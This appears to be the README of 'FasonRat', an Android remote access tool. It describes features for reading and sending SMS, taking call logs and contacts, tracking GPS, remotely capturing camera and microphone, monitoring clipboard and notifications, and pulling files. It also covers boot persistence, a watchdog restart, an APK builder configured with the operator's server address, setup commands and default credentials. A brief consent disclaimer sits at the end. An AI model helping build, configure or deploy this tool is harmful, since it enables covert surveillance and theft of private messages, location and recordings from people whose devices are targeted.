# Fason

<p align="center">
  <img src="https://img.shields.io/badge/Version-2.2.1-purple?style=flat-square" alt="Version 2.2.1">
  <img src="https://img.shields.io/badge/Android-7.0+-green?style=flat-square&logo=android" alt="Android 14+">
  <img src="https://img.shields.io/badge/Node.js-18+-339933?style=flat-square&logo=node.js" alt="Node.js 18+">
  <img src="https://img.shields.io/badge/Java-17-orange?style=flat-square&logo=openjdk" alt="Java 17">
  <img src="https://img.shields.io/badge/License-MIT-blue?style=flat-square" alt="MIT License">
</p>

<p align="center">
  <strong>Modern Android Remote Management Suite</strong><br>
  <em>A lightweight, clean, and efficient remote administration tool for Android devices.</em>
</p>

---

## ✨ Features

### 📱 Device Management
- **Device Info** - Model, manufacturer, Android version, battery, network status
- **Real-time Connection** - Socket.IO based live communication with auto-reconnect
- **Multi-device Support** - Manage multiple devices from single dashboard
- **IP Geolocation** - Country and city detection for connected devices

### 📡 Data Access
- 📱 **SMS** - Read inbox/sent messages, send SMS
- 📞 **Call Logs** - View call history with timestamps
- 👥 **Contacts** - Access device contacts
- 📍 **GPS Location** - Real-time location tracking with map view
- 📂 **File Manager** - Browse and download files from device storage
- 📷 **Camera** - Capture photos from front/back camera
- 🎤 **Microphone** - Record audio remotely
- 📋 **Clipboard** - Monitor clipboard content in real-time
- 🔔 **Notifications** - Capture and view all device notifications
- 📶 **WiFi Scanner** - Scan nearby WiFi networks
- 📦 **Installed Apps** - List all installed applications
- 🔐 **Permissions** - View all granted/denied permissions

### ⚡ Background Features
- 🔄 **Auto Boot** - Starts automatically on device boot
- 🛡️ **Watchdog** - Keeps service alive with auto-restart
- 📡 **Auto Reconnect** - Reconnects automatically on connection loss
- 🔋 **Wake Lock** - Ensures reliable background operation
- 🌐 **Network Monitor** - Detects network changes and reconnects

### 🛠️ Tools
- **APK Builder** - Build custom APK with your server configuration
- **Log Manager** - Track all system activity and events

---

<details>
<summary>🖥️ Screenshots</summary>

| Login | Dashboard |
|:-----:|:---------:|
| <img src="assets/login.png" width="400"> | <img src="assets/dashboard.png" width="400"> |

| Control Panel | APK Builder |
|:-------------:|:-----------:|
| <img src="assets/control_panel.png" width="400"> | <img src="assets/builder.png" width="400"> |

| Activity Logs |
|:-------------:|
| <img src="assets/logs.png" width="400"> |

</details>

---

<details>
<summary>📋 Requirements & Installation</summary>

### Requirements

| Component | Requirement |
|-----------|-------------|
| **Server** | Node.js 18+, npm/yarn, Java 8+ (for APK builder) |
| **Android** | SDK 24+ (Android 7.0), Target SDK 34 (Android 14), Java 17 |

### Quick Start

```bash
# Clone repository
git clone https://github.com/fahimahamedwork/FasonRat.git
cd FasonRat

# Install and start server
npm install
npm start
```

Access control panel at `http://localhost:22533`

> 🔐 **Default Credentials:** `admin` / `fason`

### Build APK

**Option A: Web Builder (Recommended)**
1. Open control panel → **Builder**
2. Enter server URL → Click **Build APK**
3. Download signed APK

**Option B: Gradle**
```bash
cd fason
./gradlew assembleDebug      # Debug build
./gradlew assembleRelease    # Release build
```

</details>

<details>
<summary>⚙️ Configuration</summary>

### Server (`server/core/config.js`)
```javascript
module.exports = {
    port: 22533,
    debug: false,
    limits: {
        maxClients: 500,
        maxFileSize: 50 * 1024 * 1024  // 50MB
    }
};
```

### Android (`fason/app/.../Config.java`)
```java
public class Config {
    public static final String SERVER_HOST = "http://YOUR_SERVER_IP:22533";
    public static final String HOME_PAGE_URL = "https://google.com";
}
```

</details>

<details>
<summary>📖 How to Use</summary>

### Dashboard
- View all connected devices with online/offline status
- See device info: model, Android version, IP location
- Click on a device to access control panel

### Device Control Panel

| Tab | Description |
|-----|-------------|
| **Info** | Device details, battery, network status |
| **SMS** | Read/send messages, view conversations |
| **Calls** | Call history with timestamps |
| **Contacts** | Browse all contacts |
| **Location** | GPS location on map, polling interval |
| **Files** | Browse storage, download files |
| **Camera** | List cameras, capture photos |
| **Mic** | Record audio with duration control |
| **Apps** | Installed applications list |
| **WiFi** | Scan nearby networks |
| **Clipboard** | Clipboard history |
| **Notifications** | Captured notifications |
| **Permissions** | Granted/denied permissions |

### Activity Logs
- View all system events and operations
- Filter by type, category, or search
- Monitor login attempts, commands, errors

</details>

<details>
<summary>🔧 How it Works</summary>

### Architecture
```
┌─────────────────┐        Socket.IO         ┌─────────────────┐
│   Android App   │◄────────────────────────►│  Control Panel  │
│   (Java 17)     │     WebSocket/Polling    │   (Node.js)     │
└─────────────────┘                          └─────────────────┘
```

### Communication Flow
1. **Connection** - App starts `MainService`, connects to server with device info
2. **Commands** - User sends command → Server emits event → App processes → Result returned
3. **Sync** - Real-time WebSocket updates, auto-reconnection, JSON storage

### Android Components

| Component | Purpose |
|-----------|---------|
| `MainService` | Foreground service, keeps connection alive |
| `SocketClient` | Socket.IO with auto-reconnect |
| `BootReceiver` | Auto-start on device boot |
| `WatchdogReceiver` | Restart service if killed |
| `Feature Managers` | Camera, Mic, GPS, SMS, etc. |

### Server Components

| Component | Purpose |
|-----------|---------|
| `Express Server` | Web interface and API |
| `Socket.IO Server` | Real-time communication |
| `LowDB` | JSON data storage |
| `APK Builder` | Modify and sign APKs |

</details>

---

<details>
<summary>📁 Project Structure</summary>

```
FasonRat/
├── index.js                      # Main entry point
├── package.json                  # Dependencies
│
├── fason/                        # Android Application
│   └── app/src/main/
│       ├── java/com/fason/app/
│       │   ├── core/             # App, Config, Socket, Permissions
│       │   ├── features/         # Camera, Mic, SMS, GPS, etc.
│       │   ├── service/          # MainService
│       │   └── receiver/         # Boot & Watchdog receivers
│       └── AndroidManifest.xml
│
├── server/                       # Control Panel Server
│   ├── core/                     # Routes, Socket, Builder, Logs
│   ├── web/                      # EJS templates, CSS, JS
│   ├── database/                 # JSON database
│   └── app/factory/              # APK build tools
│
└── assets/                       # Documentation images
```

</details>

<details>
<summary>🔒 Permissions</summary>

| Permission | Purpose |
|------------|---------|
| `INTERNET` | Server communication |
| `ACCESS_NETWORK_STATE` | Network status |
| `ACCESS_WIFI_STATE` | WiFi information |
| `READ_SMS` / `SEND_SMS` | SMS access |
| `READ_CALL_LOG` | Call history |
| `READ_CONTACTS` | Contact access |
| `READ_PHONE_STATE` | Device info |
| `ACCESS_FINE_LOCATION` | GPS tracking |
| `ACCESS_COARSE_LOCATION` | Network location |
| `CAMERA` | Photo capture |
| `RECORD_AUDIO` | Audio recording |
| `READ_EXTERNAL_STORAGE` | File access (≤Android 10) |
| `MANAGE_EXTERNAL_STORAGE` | Full storage (≥Android 11) |
| `READ_MEDIA_*` | Media access (≥Android 13) |
| `RECEIVE_BOOT_COMPLETED` | Auto-start on boot |
| `FOREGROUND_SERVICE` | Background operation |
| `POST_NOTIFICATIONS` | Notifications (≥Android 13) |

</details>

<details>
<summary>📊 Tech Stack</summary>

### Android
| Technology | Version |
|------------|---------|
| Language | Java 17 |
| Min SDK | 24 (Android 7.0) |
| Target SDK | 34 (Android 14) |
| Socket.IO | 2.0.1 |
| UI | Material Design 3 |
| Camera | CameraX 1.3.3 |
| Location | Play Services 21.2.0 |

### Server
| Technology | Version |
|------------|---------|
| Runtime | Node.js 18+ |
| Framework | Express.js 4.17 |
| Real-time | Socket.IO 4.8 |
| Database | LowDB 1.0 |
| Templates | EJS 3.1 |

</details>

---

<details>
<summary>🛡️ Security Notes</summary>

⚠️ **This tool is intended for:**
- Personal device management
- Parental control (with consent)
- Enterprise device management
- Educational purposes

**Do NOT use for:**
- Unauthorized device access
- Surveillance without consent
- Any illegal activities

> Always ensure proper authorization before installing on any device.

</details>

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 👨‍💻 Author

**Fahim Ahamed**

[![GitHub](https://img.shields.io/badge/GitHub-fahimahamedwork-181717?style=flat-square&logo=github)](https://github.com/fahimahamed1) 

---

## ⭐ Support

If you find this project useful, please consider giving it a star! 🌟 We'd be happy to receive contributions, issues, or ideas.

---

<p align="center">
  Made with ❤️ for the open-source community
</p>
